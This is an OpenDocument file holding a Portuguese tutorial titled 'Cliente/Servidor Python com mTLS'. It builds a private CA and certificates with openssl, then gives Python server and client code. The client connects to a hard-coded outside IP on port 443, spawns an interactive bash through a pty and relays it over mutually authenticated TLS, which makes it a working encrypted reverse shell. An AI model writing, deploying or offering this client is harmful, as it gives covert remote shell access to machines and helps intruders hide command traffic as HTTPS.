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2c36" officeooo:paragraph-rsid="000b2c36"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:text-properties officeooo:rsid="000b2c36" officeooo:paragraph-rsid="000b2c36"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:text-properties officeooo:rsid="000b2c36" officeooo:paragraph-rsid="0011a886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2">
      <style:text-properties fo:font-size="14pt" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:text-properties fo:font-size="14pt" officeooo:rsid="000b2c36" officeooo:paragraph-rsid="0011edb8" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:text-properties fo:font-size="14pt" officeooo:paragraph-rsid="0011edb8" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Heading_20_3">
      <style:text-properties fo:font-size="14pt" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Heading_20_3">
      <style:text-properties officeooo:paragraph-rsid="0011edb8"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Horizontal_20_Line">
      <style:text-properties officeooo:paragraph-rsid="0011edb8"/>
    </style:style>
    <style:style style:name="P15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1edb8"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties style:writing-mode="lr-tb"/>
      <style:text-properties officeooo:paragraph-rsid="0011edb8"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0.1965in" style:contextual-spacing="false" style:writing-mode="lr-tb"/>
      <style:text-properties officeooo:paragraph-rsid="0011edb8"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:paragraph-rsid="0011edb8"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties style:writing-mode="lr-tb"/>
      <style:text-properties fo:color="#2a6099" loext:opacity="100%" style:font-name="Courier" fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties style:writing-mode="lr-tb"/>
      <style:text-properties fo:color="#2a6099" loext:opacity="100%" style:font-name="Courier" fo:font-weight="bold" officeooo:paragraph-rsid="0011edb8" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties style:writing-mode="lr-tb"/>
      <style:text-properties fo:color="#7b3d00" loext:opacity="100%" style:font-name="Courier" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties style:writing-mode="lr-tb"/>
      <style:text-properties fo:color="#7b3d00" loext:opacity="100%" style:font-name="Courier" officeooo:paragraph-rsid="0011edb8"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-top="0in" fo:margin-bottom="0in" style:contextual-spacing="false"/>
      <style:text-properties fo:color="#7b3d00" loext:opacity="100%" style:font-name="Courier" fo:font-size="9pt" officeooo:rsid="00125e50" officeooo:paragraph-rsid="00125e50" style:font-size-asian="9pt" style:font-size-complex="9pt"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="00125e50" officeooo:paragraph-rsid="00125e50"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="00125e50" officeooo:paragraph-rsid="00125e50" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P26" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties style:writing-mode="lr-tb"/>
    </style:style>
    <style:style style:name="P27" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties style:writing-mode="lr-tb"/>
      <style:text-properties officeooo:paragraph-rsid="0014c344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T1" style:family="text">
      <style:text-properties officeooo:rsid="000d6188"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties style:font-name="Courie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1edb8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1edb8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2a6099" loext:opacity="100%" style:font-name="Courier" fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:color="#7b3d00" loext:opacity="100%" style:font-name="Courier"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties fo:color="#7b3d00" loext:opacity="100%" style:font-name="Courier" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties fo:color="#55308d" loext:opacity="100%" style:font-name="Courier"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties fo:color="#55308d" loext:opacity="100%" style:font-name="Courier" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties officeooo:rsid="0014c34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📘Cliente/Servidor Python com mTLS</text:h>
      <text:p text:style-name="Text_20_body"><text:span text:style-name="Strong_20_Emphasis">Execução remota de comandos via TLS com autenticação mútua por certificado</text:span></text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🎯 Objetivo</text:h>
      <text:p text:style-name="Text_20_body">Criar um sistema <text:span text:style-name="Strong_20_Emphasis">cliente/servidor em Python</text:span> onde:</text:p>
      <text:list text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P28">O <text:span text:style-name="Strong_20_Emphasis">servidor</text:span>:</text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P28">Escuta conexões TLS</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P28">Autentica o cliente via certificado (mTLS)</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P28">Envia comandos de shell</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P28">O <text:span text:style-name="Strong_20_Emphasis">cliente</text:span>:</text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P28">Autentica o servidor via certificado</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P28">Recebe comandos</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P28">Executa no shell local</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P28">Retorna stdout/stderr ao servidor</text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body">🔐 Toda a comunicação é <text:span text:style-name="Strong_20_Emphasis">criptografada</text:span> e <text:span text:style-name="Strong_20_Emphasis">autenticada por certificados X.509</text:span>.</text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">🧱 Arquitetura</text:h>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">[ Servidor Python ]</text:span></text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2"><text:s text:c="8"/>|</text:span></text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2"><text:s text:c="8"/>| <text:s/>TLS + mTLS</text:span></text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2"><text:s text:c="8"/>|</text:span></text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2">[ Cliente Python ]</text:span></text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2"><text:s text:c="8"/>|</text:span></text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T2"><text:s text:c="3"/>Execução de shell</text:span></text:span></text:p>
      <text:list text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P29">TLS sobre TCP</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P29">Autenticação mútua (client + server)</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P29">CA própria (PKI local)</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">📁 Estrutura de diretórios</text:h>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text">client_server/</text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text">├── certs/</text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text">│ <text:s text:c="2"/>├── ca.crt</text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text">│ <text:s text:c="2"/>├── ca.key</text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text">│ <text:s text:c="2"/>├── ca.cnf</text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text">│ <text:s text:c="2"/>├── server.crt</text:span></text:p>
      <text:p text:style-name="P27"><text:soft-page-break/><text:span text:style-name="Source_20_Text">│ <text:s text:c="2"/>├── server.</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T13">csr</text:span></text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text">│ <text:s text:c="2"/>├── server.key</text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text">│ <text:s text:c="2"/>├── client.crt</text:span></text:p>
      <text:p text:style-name="P27"><text:span text:style-name="Source_20_Text">│ <text:s text:c="2"/>├── client.</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T13">csr</text:span></text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text">│ <text:s text:c="2"/>└── client.key</text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text">├── server.py</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="Source_20_Text">└── client.py</text:span></text:p>
      <text:h text:style-name="P3" text:outline-level="2">🔑 Parte 1 – Criação da PKI (CA + Certificados)</text:h>
      <text:h text:style-name="P3" text:outline-level="2"><text:span text:style-name="T4">A</text:span><text:span text:style-name="T3">rquivo </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T3">ca.cnf</text:span></text:span></text:h>
      <text:p text:style-name="P15"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T10">[ req ]</text:span></text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T10">prompt = no</text:span></text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T10">distinguished_name = dn</text:span></text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T10">x509_extensions = v3_ca</text:span></text:span></text:p>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T10">[ dn ]</text:span></text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T10">CN = MyTestCA</text:span></text:span></text:p>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T10">[ v3_ca ]</text:span></text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T10">basicConstraints = critical, CA:TRUE</text:span></text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T10">keyUsage = critical, keyCertSign, cRLSign</text:span></text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T10">subjectKeyIdentifier = hash</text:span></text:span></text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="P9" text:outline-level="2">Criar a CA</text:h>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8">openssl genrsa -out ca.key 4096</text:span></text:span></text:p>
      <text:p text:style-name="P19"/>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8">openssl req -x509 \</text:span></text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8"><text:s text:c="2"/>-new \</text:span></text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8"><text:s text:c="2"/>-nodes \</text:span></text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8"><text:s text:c="2"/>-key ca.key \</text:span></text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8"><text:s text:c="2"/>-sha256 \</text:span></text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8"><text:s text:c="2"/>-days 3650 \</text:span></text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8"><text:s text:c="2"/>-out ca.crt \</text:span></text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8"><text:s text:c="2"/>-config ca.cnf</text:span></text:span></text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Verificação:</text:h>
      <text:p text:style-name="P5"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8">openssl x509 -in ca.crt -noout -text | grep -A5 "Basic Constraints"</text:span></text:span></text:p>
      <text:p text:style-name="Text_20_body">✔ Deve aparecer:</text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T11">Basic Constraints: critical</text:span></text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T11"><text:s text:c="4"/>CA:TRUE</text:span></text:span></text:p>
      <text:h text:style-name="P10" text:outline-level="2">Criar certificado <text:span text:style-name="T1">do servidor</text:span> com SAN</text:h>
      <text:p text:style-name="P18"><text:span text:style-name="T6">A</text:span><text:span text:style-name="T5">rquivo </text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">server.cnf</text:span></text:span><text:span text:style-name="T5">:</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T9">[ req ]</text:span></text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T9">default_bits <text:s text:c="6"/>= 2048</text:span></text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T9">prompt <text:s text:c="12"/>= no</text:span></text:span></text:p>
      <text:p text:style-name="P16"><text:soft-page-break/><text:span text:style-name="Source_20_Text"><text:span text:style-name="T9">default_md <text:s text:c="8"/>= sha256</text:span></text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T9">distinguished_name = dn</text:span></text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T9">req_extensions <text:s text:c="4"/>= req_ext</text:span></text:span></text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P16"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T9">[ dn ]</text:span></text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T9">CN = 127.0.0.1</text:span></text:span></text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P16"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T9">[ req_ext ]</text:span></text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T9">subjectAltName = @alt_names</text:span></text:span></text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P16"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T9">[ alt_names ]</text:span></text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T9">IP.1 = 127.0.0.1</text:span></text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T9">DNS.1 = server</text:span></text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T9">DNS.2 = localhost</text:span></text:span></text:p>
      <text:p text:style-name="P14"/>
      <text:h text:style-name="P13" text:outline-level="3">Gerar novo certificado do servidor</text:h>
      <text:p text:style-name="P15"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8">openssl genrsa -out server.key 2048</text:span></text:span></text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P16"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8">openssl req -new -key server.key -out server.csr -config server.cnf</text:span></text:span></text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P16"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8">openssl x509 -req -in server.csr \</text:span></text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8"><text:s text:c="2"/>-CA ca.crt -CAkey ca.key -CAcreateserial \</text:span></text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8"><text:s text:c="2"/>-out server.crt -days 365 -sha256 \</text:span></text:span></text:p>
      <text:p text:style-name="P17"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8"><text:s text:c="2"/>-extensions req_ext -extfile server.cnf</text:span></text:span></text:p>
      <text:p text:style-name="P14"/>
      <text:h text:style-name="P11" text:outline-level="2">Criar certificado do CLIENTE</text:h>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8">openssl genrsa -out client.key 2048</text:span></text:span></text:p>
      <text:p text:style-name="P19"/>
      <text:p text:style-name="P7"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8">openssl req -new -key client.key -out client.csr</text:span></text:span></text:p>
      <text:p text:style-name="Text_20_body">Assinar com a CA <text:span text:style-name="Strong_20_Emphasis">válida</text:span>:</text:p>
      <text:p text:style-name="P4"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8">openssl x509 -req \</text:span></text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8"><text:s text:c="2"/>-in client.csr \</text:span></text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8"><text:s text:c="2"/>-CA ca.crt \</text:span></text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8"><text:s text:c="2"/>-CAkey ca.key \</text:span></text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8"><text:s text:c="2"/>-CAcreateserial \</text:span></text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8"><text:s text:c="2"/>-out client.crt \</text:span></text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8"><text:s text:c="2"/>-days 365 \</text:span></text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8"><text:s text:c="2"/>-sha256</text:span></text:span></text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:h text:style-name="P9" text:outline-level="2">Verificação</text:h>
      <text:p text:style-name="P5"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T8">openssl verify -CAfile ca.crt client.crt</text:span></text:span></text:p>
      <text:h text:style-name="P12" text:outline-level="3">✅ Resultado esperado</text:h>
      <text:p text:style-name="P5"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">client.crt: OK</text:span></text:span></text:p>
      <text:p text:style-name="Horizontal_20_Line"/>
      <text:p text:style-name="P1"><text:soft-page-break/></text:p>
      <text:h text:style-name="P2" text:outline-level="2"/>
      <text:h text:style-name="P3" text:outline-level="2">🖥️ Parte 2 – Servidor Python (mTLS)</text:h>
      <text:p text:style-name="P24"><text:span text:style-name="T7">Servidor:</text:span> </text:p>
      <text:p text:style-name="P23">import socket, ssl, threading, sys</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23">HOST = "0.0.0.0"</text:p>
      <text:p text:style-name="P23">PORT = 443</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23">context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)</text:p>
      <text:p text:style-name="P23">context.load_cert_chain(certfile="certs/server.crt", keyfile="certs/server.key")</text:p>
      <text:p text:style-name="P23">context.load_verify_locations(cafile="certs/ca.crt")</text:p>
      <text:p text:style-name="P23">context.verify_mode = ssl.CERT_REQUIRED <text:s text:c="2"/># 🔐 exige cert do cliente</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23">server = socket.socket()</text:p>
      <text:p text:style-name="P23">server.bind((HOST, PORT))</text:p>
      <text:p text:style-name="P23">server.listen(1)</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23">print("[+] Aguardando conexão mTLS...")</text:p>
      <text:p text:style-name="P23">conn, addr = server.accept()</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23">try:</text:p>
      <text:p text:style-name="P23"><text:s text:c="4"/>tls_conn = context.wrap_socket(conn, server_side=True)</text:p>
      <text:p text:style-name="P23"><text:s text:c="4"/>print("[+] Cliente autenticado com sucesso")</text:p>
      <text:p text:style-name="P23"><text:s text:c="4"/>print(" <text:s text:c="3"/>Subject:", tls_conn.getpeercert()["subject"])</text:p>
      <text:p text:style-name="P23">except ssl.SSLError as e:</text:p>
      <text:p text:style-name="P23"><text:s text:c="4"/>print("[-] Falha TLS:", e)</text:p>
      <text:p text:style-name="P23"><text:s text:c="4"/>conn.close()</text:p>
      <text:p text:style-name="P23"><text:s text:c="4"/>exit(1)</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23">def recv_data():</text:p>
      <text:p text:style-name="P23"><text:s text:c="4"/>while True:</text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/>data = tls_conn.recv(4096)</text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/>if not data:</text:p>
      <text:p text:style-name="P23"><text:s text:c="12"/>break</text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/>sys.stdout.buffer.write(data)</text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/>sys.stdout.flush()</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23">def send_data():</text:p>
      <text:p text:style-name="P23"><text:s text:c="4"/>while True:</text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/>data = sys.stdin.buffer.read(1)</text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/>if not data:</text:p>
      <text:p text:style-name="P23"><text:s text:c="12"/>break</text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/>tls_conn.sendall(data)</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23">threading.Thread(target=recv_data, daemon=True).start()</text:p>
      <text:p text:style-name="P23">threading.Thread(target=send_data, daemon=True).start()</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23">threading.Event().wait()</text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P25">Cliente:</text:p>
      <text:p text:style-name="P23"><text:soft-page-break/>import socket, ssl, os, pty, threading</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23">SERVER_IP = "13.221.46.202"</text:p>
      <text:p text:style-name="P23">SERVER_PORT = 443</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23">context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile="certs/ca.crt")</text:p>
      <text:p text:style-name="P23">context.load_cert_chain(certfile="certs/client.crt", keyfile="certs/client.key")</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23">sock = socket.socket()</text:p>
      <text:p text:style-name="P23">tls_sock = context.wrap_socket(sock, server_hostname="server")</text:p>
      <text:p text:style-name="P23">tls_sock.connect((SERVER_IP, SERVER_PORT))</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23">pid, fd = pty.fork()</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23">if pid == 0:</text:p>
      <text:p text:style-name="P23"><text:s text:c="4"/>os.execvp("/bin/bash", ["/bin/bash", "-i"])</text:p>
      <text:p text:style-name="P23">else:</text:p>
      <text:p text:style-name="P23"><text:s text:c="4"/>def socket_to_shell():</text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/>while True:</text:p>
      <text:p text:style-name="P23"><text:s text:c="12"/>data = tls_sock.recv(1024)</text:p>
      <text:p text:style-name="P23"><text:s text:c="12"/>if not data:</text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/>break</text:p>
      <text:p text:style-name="P23"><text:s text:c="12"/>os.write(fd, data)</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23"><text:s text:c="4"/>def shell_to_socket():</text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/>while True:</text:p>
      <text:p text:style-name="P23"><text:s text:c="12"/>try:</text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/>data = os.read(fd, 1024)</text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/>if not data:</text:p>
      <text:p text:style-name="P23"><text:s text:c="20"/>break</text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/>tls_sock.sendall(data)</text:p>
      <text:p text:style-name="P23"><text:s text:c="12"/>except OSError:</text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/>break</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23"><text:s text:c="4"/>threading.Thread(target=socket_to_shell, daemon=True).start()</text:p>
      <text:p text:style-name="P23"><text:s text:c="4"/>threading.Thread(target=shell_to_socket, daemon=True).start()</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23"><text:s text:c="4"/>threading.Event().wait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20:35:06.274383057</meta:creation-date>
    <dc:date>2025-12-31T11:20:02.339095873</dc:date>
    <meta:editing-duration>PT40M28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5" meta:paragraph-count="174" meta:word-count="561" meta:character-count="4554" meta:non-whitespace-character-count="3737"/>
  </office:meta>
</office:document-meta>
</file>